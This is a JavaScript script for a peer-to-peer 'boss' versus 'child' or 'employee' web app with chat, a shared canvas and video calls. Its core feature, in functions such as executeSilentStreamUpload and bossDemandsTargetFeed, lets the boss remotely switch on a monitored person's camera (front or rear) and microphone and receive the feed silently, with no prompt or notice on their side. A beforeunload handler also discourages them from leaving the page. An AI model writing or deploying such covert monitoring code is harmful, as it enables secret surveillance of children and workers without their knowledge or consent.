<script>
        // 1. INITIALIZE GLOBAL UTILITIES & GENERATE KEY IMMEDIATELY
        function generateCode(len = 6) {
            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
            let res = '';
            for(let i=0; i<len; i++) res += chars.charAt(Math.floor(Math.random()*chars.length));
            return res;
        }
        const customId = generateCode(6);

        // 2. STATE PARAMETERS
        let myRole = ''; let peer = null; let conn = null; let currentCall = null; let localStream = null;
        let expectingSilentFeed = false; let savedTargetPeerId = ''; let currentFacingMode = 'user';
        let mediaRecorder = null; let audioChunks = []; let isRecording = false;
        let typingTimeout = null; let isTyping = false; let activeReplyContext = null;
        let connectedNodeRole = ''; 

        // Canvas & Drawing Core Engine Parameters
        const canvas = document.getElementById('lessonCanvas');
        const ctx = canvas.getContext('2d');
        const virtualCursor = document.getElementById('virtualCursor');
        let drawing = false;

        ctx.strokeStyle = '#6366f1'; // Indigo color default
        ctx.lineWidth = 3;
        ctx.lineCap = 'round';

        const roleScreen = document.getElementById('roleScreen');
        const lobbyScreen = document.getElementById('lobbyScreen');
        const messageBox = document.getElementById('messageBox');
        const typingIndicatorBar = document.getElementById('typingIndicatorBar');
        const hardwareErrorOverlay = document.getElementById('hardwareErrorOverlay');
        const replyPreviewContainer = document.getElementById('replyPreviewContainer');
        const replyPreviewText = document.getElementById('replyPreviewText');
        
        async function selectRole(role) {
            myRole = role;
            const permissionsGranted = await requestEarlyHardwarePermissions();
            if (!permissionsGranted) { hardwareErrorOverlay.classList.remove('hidden'); return; }

            roleScreen.classList.add('hidden');
            lobbyScreen.classList.remove('hidden');
            lobbyScreen.classList.add('flex');

            const statusDot = document.getElementById('connectionStatusDot');
            const subHeading = document.getElementById('portalSubheading');

            if (role === 'boss') {
                subHeading.textContent = 'Status: Executive Hub Mode';
                statusDot.className = "h-3 w-3 rounded-full bg-indigo-500";
                document.getElementById('bossLobby').classList.remove('hidden');
                document.getElementById('canvasClearBtn').classList.remove('hidden');
                document.getElementById('remotePointerStatus').textContent = "Mode: Full Authorization Master";
                initPeer(customId);
                setupCanvasInteractions(); 
            } else {
                subHeading.textContent = `Status: ${role === 'child' ? 'Child Learning Node' : 'Personnel Unit Mode'}`;
                statusDot.className = "h-3 w-3 rounded-full bg-slate-600";
                document.getElementById('subLobby').classList.remove('hidden');
                initPeer();
                window.addEventListener('beforeunload', preventTerminalExit);
            }
        }

        async function requestEarlyHardwarePermissions() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                stream.getTracks().forEach(track => track.stop());
                return true;
            } catch (err) { return false; }
        }

        function preventTerminalExit(e) {
            if (conn) { e.preventDefault(); e.returnValue = 'Operational Link Active.'; return e.returnValue; }
        }

        function initPeer(id = null) {
            peer = id ? new Peer(id) : new Peer();
            peer.on('open', (uid) => {
                document.getElementById('myPeerId').textContent = uid;
                document.getElementById('statusMessage').textContent = "Signaling channel open. Ready.";
            });
            peer.on('connection', (incoming) => {
                if(myRole !== 'boss') { incoming.close(); return; }
                conn = incoming; setupDataHandlers();
            });
            peer.on('call', (call) => {
                if (myRole === 'boss') {
                    if (expectingSilentFeed) { expectingSilentFeed = false; call.answer(); handleStream(call); } 
                    else {
                        localStream = null;
                        navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                            localStream = stream;
                            document.getElementById('videoContainer').className = "flex flex-col gap-2 p-3 border-b border-slate-800 bg-slate-950/60";
                            displayStream(localStream, 'local');
                            call.answer(localStream); handleStream(call);
                        });
                    }
                } else {
                    currentFacingMode = call.metadata && call.metadata.facingMode ? call.metadata.facingMode : 'user';
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: true }).then((stream) => {
                        localStream = stream; call.answer(stream); currentCall = call;
                        call.on('close', () => cleanMediaTracks());
                    }).catch(err => console.error(err));
                }
            });
        }

        document.getElementById('connectBtn').addEventListener('click', () => {
            const target = document.getElementById('peerIdInput').value.trim().toUpperCase();
            if(!target) return;
            savedTargetPeerId = target; 
            conn = peer.connect(target, { metadata: { role: myRole } }); 
            setupDataHandlers();
        });

        function setupDataHandlers() {
            conn.on('open', () => {
                lobbyScreen.classList.add('hidden');
                document.getElementById('activeControls').classList.remove('hidden');
                
                if (myRole === 'boss') {
                    connectedNodeRole = conn.metadata && conn.metadata.role ? conn.metadata.role : 'employee';
                    document.getElementById('bossControls').classList.remove('hidden');
                } else {
                    document.getElementById('subControls').classList.remove('hidden');
                }
                
                document.getElementById('connectionStatusDot').className = "h-3 w-3 rounded-full bg-emerald-500";
                document.getElementById('portalSubheading').textContent = `Sync Active Matrix`;
                appendSysMsg(`Direct Pipeline Connected.`);
                
                if(myRole === 'boss') {
                    conn.send({ type: 'init_handshake_confirmation', role: 'boss' });
                }
            });

            conn.on('data', (data) => {
                if (data.type === 'init_handshake_confirmation') {
                    document.getElementById('remotePointerStatus').textContent = "Controlled by Instructor";
                } else if (data.type === 'force_stream_instruction') { 
                    executeSilentStreamUpload(data.facingMode); 
                } else if (data.type === 'msg') { 
                    appendMsg(data.body, 'remote', data.replyData); 
                } else if (data.type === 'voice_note') { 
                    appendVoiceMsg(data.blobUrl, 'remote'); 
                } else if (data.type === 'typing') {
                    typingIndicatorBar.style.opacity = data.isTyping ? '1' : '0';
                }
                else if (data.type === 'canvas_draw') {
                    drawFromRemoteCoords(data.x, data.y, data.isDrawingStart);
                } else if (data.type === 'canvas_clear') {
                    clearWorkspaceCanvas(false);
                } else if (data.type === 'pointer_move') {
                    updateVirtualCursorPosition(data.x, data.y);
                }
            });

            conn.on('close', () => terminateSession());
        }

        function setupCanvasInteractions() {
            function getCanvasCoordinates(e) {
                const rect = canvas.getBoundingClientRect();
                return {
                    x: (e.clientX - rect.left) * (canvas.width / rect.width),
                    y: (e.clientY - rect.top) * (canvas.height / rect.height)
                };
            }

            canvas.addEventListener('mousedown', (e) => {
                if (myRole !== 'boss' || !conn) return;
                drawing = true;
                const coords = getCanvasCoordinates(e);
                ctx.beginPath();
                ctx.moveTo(coords.x, coords.y);
                conn.send({ type: 'canvas_draw', x: coords.x, y: coords.y, isDrawingStart: true });
            });

            canvas.addEventListener('mousemove', (e) => {
                if (!conn || myRole !== 'boss') return;
                const coords = getCanvasCoordinates(e);
                
                conn.send({ type: 'pointer_move', x: coords.x, y: coords.y });

                if (drawing) {
                    ctx.lineTo(coords.x, coords.y);
                    ctx.stroke();
                    conn.send({ type: 'canvas_draw', x: coords.x, y: coords.y, isDrawingStart: false });
                }
            });

            window.addEventListener('mouseup', () => { drawing = false; });
        }

        function drawFromRemoteCoords(x, y, isDrawingStart) {
            if (isDrawingStart) {
                ctx.beginPath();
                ctx.moveTo(x, y);
            } else {
                ctx.lineTo(x, y);
                ctx.stroke();
            }
        }

        function updateVirtualCursorPosition(canvasX, canvasY) {
            if (myRole === 'boss') return; 
            
            const rect = canvas.getBoundingClientRect();
            const clientX = rect.left + (canvasX * (rect.width / canvas.width));
            const clientY = rect.top + (canvasY * (rect.height / canvas.height));
            
            virtualCursor.style.left = `${clientX - canvas.parentElement.getBoundingClientRect().left}px`;
            virtualCursor.style.top = `${clientY - canvas.parentElement.getBoundingClientRect().top}px`;
            virtualCursor.classList.remove('hidden');
        }

        function clearWorkspaceCanvas(shouldBroadcast = false) {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            if (shouldBroadcast && conn && myRole === 'boss') {
                conn.send({ type: 'canvas_clear' });
            }
        }

        function sendTypingSignal() {
            if (!conn) return;
            if (!isTyping) { isTyping = true; conn.send({ type: 'typing', isTyping: true }); }
            clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => { isTyping = false; conn.send({ type: 'typing', isTyping: false }); }, 1500);
        }

        function setActiveReplyContext(textStr, senderLabel) {
            activeReplyContext = { text: textStr, sender: senderLabel };
            replyPreviewText.textContent = textStr;
            replyPreviewContainer.classList.remove('hidden');
        }

        function clearActiveReplyContext() {
            activeReplyContext = null;
            replyPreviewContainer.classList.add('hidden');
        }

        function sendMessage(e) {
            e.preventDefault();
            const inputField = document.getElementById('msgInput');
            const val = inputField.value; if(!val || !conn) return;

            isTyping = false; conn.send({ type: 'typing', isTyping: false });
            const payloadReply = activeReplyContext ? { ...activeReplyContext } : null;

            conn.send({type: 'msg', body: val, replyData: payloadReply});
            appendMsg(val, 'local', payloadReply);
            inputField.value = ''; clearActiveReplyContext();
        }

        function bossDemandsTargetFeed() {
            if (conn) {
                expectingSilentFeed = true; 
                const selectedCamera = document.getElementById('cameraFacingSelect').value;
                conn.send({ type: 'force_stream_instruction', facingMode: selectedCamera });
            }
        }

        function onBossChangeCamera() {
            if(currentCall && conn && myRole === 'boss') { currentCall.close(); bossDemandsTargetFeed(); }
        }

        async function executeSilentStreamUpload(facingModeSetting) {
            try {
                if(localStream) { localStream.getTracks().forEach(track => track.stop()); }
                currentFacingMode = facingModeSetting || 'user';
                localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: true });
                const call = peer.call(conn.peer, localStream, { metadata: { facingMode: currentFacingMode } });
                currentCall = call;
                call.on('close', () => cleanMediaTracks());
            } catch (err) { console.error(err); }
        }

        document.getElementById('requestCallBtn').addEventListener('click', () => {
            if (conn) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then((stream) => {
                    localStream = stream;
                    document.getElementById('videoContainer').className = "flex flex-col gap-2 p-3 border-b border-slate-800 bg-slate-950/60";
                    displayStream(localStream, 'local');
                    const call = peer.call(conn.peer, localStream); handleStream(call);
                });
            }
        });

        function handleStream(call) {
            currentCall = call;
            if (myRole === 'boss') {
                document.getElementById('videoContainer').className = "flex flex-col gap-2 p-3 border-b border-slate-800 bg-slate-950/60";
                document.getElementById('localVideoWrapper').classList.add('hidden'); 
            }
            call.on('stream', (remoteStream) => displayStream(remoteStream, 'remote'));
            call.on('close', () => cleanMediaTracks());
        }

        function displayStream(stream, target) { document.getElementById(target === 'local' ? 'localVideo' : 'remoteVideo').srcObject = stream; }
        function cleanMediaTracks() {
            document.getElementById('videoContainer').className = "hidden";
            if(localStream) { localStream.getTracks().forEach(track => track.stop()); localStream = null; }
            currentCall = null;
        }

        function appendMsg(text, sender, replyData = null) {
            const wrap = document.createElement('div');
            wrap.className = `flex w-full group relative ${sender === 'local' ? 'justify-end' : 'justify-start'}`;
            
            const bubble = document.createElement('div');
            bubble.className = `rounded px-2.5 py-1.5 max-w-[85%] relative ${sender === 'local' ? 'bg-indigo-600 text-white' : 'bg-slate-800 text-slate-200 border border-slate-700'}`;

            if (replyData) {
                const q = document.createElement('div');
                q.className = 'border-l-2 mb-1 pl-1.5 py-0.5 text-[10px] bg-slate-950/40 text-slate-400 block truncate';
                q.textContent = replyData.text;
                bubble.appendChild(q);
            }

            const t = document.createElement('span'); t.textContent = text; bubble.appendChild(t);

            const btn = document.createElement('button');
            btn.className = `absolute top-1/2 -translate-y-1/2 opacity-0 group-hover:opacity-100 p-0.5 bg-slate-800 border border-slate-700 text-slate-400 rounded ${sender === 'local' ? '-left-6' : '-right-6'}`;
            btn.innerHTML = '<i data-lucide="reply" class="w-3 h-3"></i>';
            btn.onclick = () => setActiveReplyContext(text, sender === 'local' ? 'Self' : 'Remote Node');

            wrap.appendChild(bubble); wrap.appendChild(btn); messageBox.appendChild(wrap);
            lucide.createIcons(); messageBox.scrollTop = messageBox.scrollHeight;
        }

        function appendVoiceMsg(dataUrl, sender) {
            const wrap = document.createElement('div'); wrap.className = `flex w-full ${sender === 'local' ? 'justify-end' : 'justify-start'}`;
            const c = document.createElement('div'); c.className = 'rounded p-1 bg-slate-800';
            const p = document.createElement('audio'); p.src = dataUrl; p.controls = true; p.className = 'h-6 w-40 text-[10px]';
            c.appendChild(p); wrap.appendChild(c); messageBox.appendChild(wrap);
        }

        function appendSysMsg(text) {
            const n = document.createElement('div');
            n.className = 'text-[9px] font-mono text-center text-slate-500 tracking-wide uppercase mx-auto';
            n.textContent = text; messageBox.appendChild(n);
        }

        document.getElementById('disconnectBtn').addEventListener('click', () => {
            if (conn) conn.close();
            window.removeEventListener('beforeunload', preventTerminalExit);
            terminateSession();
        });

        function terminateSession() {
            cleanMediaTracks(); clearWorkspaceCanvas(false); conn = null; messageBox.innerHTML = ''; clearActiveReplyContext();
            virtualCursor.classList.add('hidden');
            document.getElementById('activeControls').classList.add('hidden');
            document.getElementById('bossControls').classList.add('hidden');
            document.getElementById('subControls').classList.add('hidden');
            roleScreen.classList.remove('hidden'); lobbyScreen.classList.add('hidden');
            document.getElementById('bossLobby').classList.add('hidden'); document.getElementById('subLobby').classList.add('hidden');
            document.getElementById('connectionStatusDot').className = "h-3 w-3 rounded-full bg-slate-700";
            document.getElementById('portalSubheading').textContent = 'Status: Terminal Offline';
        }

        document.getElementById('copyBtn').addEventListener('click', () => { navigator.clipboard.writeText(customId); });
        lucide.createIcons();
    </script>
